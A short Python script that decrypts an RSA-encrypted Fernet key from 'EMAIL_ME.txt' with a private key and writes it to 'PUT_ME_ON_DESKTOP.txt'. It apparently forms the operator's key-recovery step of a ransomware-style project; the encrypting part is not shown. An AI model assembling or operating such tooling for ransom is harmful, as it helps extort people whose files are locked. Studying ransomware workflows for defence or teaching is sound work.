from Crypto.PublicKey import RSA  # Import RSA public key encryption functionality
from Crypto.Random import get_random_bytes  # Import random byte generation
from Crypto.Cipher import AES, PKCS1_OAEP  # Import AES and PKCS1_OAEP cipher algorithms

# Read encrypted Fernet key from the 'EMAIL_ME.txt' file
with open('EMAIL_ME.txt', 'rb') as f:
    enc_fernet_key = f.read()
    print(enc_fernet_key)  # Debugging/Testing: Print the encrypted Fernet key

# Load private RSA key from 'private.pem' file
private_key = RSA.import_key(open('private.pem').read())

# Create a private decrypter using the loaded private RSA key and PKCS1_OAEP padding scheme
private_crypter = PKCS1_OAEP.new(private_key)

# Decrypt the encrypted Fernet key using the private decrypter
dec_fernet_key = private_crypter.decrypt(enc_fernet_key)

# Write the decrypted Fernet key to 'PUT_ME_ON_DESKTOP.txt' file
with open('PUT_ME_ON_DESKTOP.txt', 'wb') as f:
    f.write(dec_fernet_key)

# Print relevant information for debugging and verification
print(f'> Private key: {private_key}')  # Print the private RSA key
print(f'> Private decrypter: {private_crypter}')  # Print the private decrypter object
print(f'> Decrypted fernet key: {dec_fernet_key}')  # Print the decrypted Fernet key
print('> Decryption Completed')  # Indicate that decryption process is completed
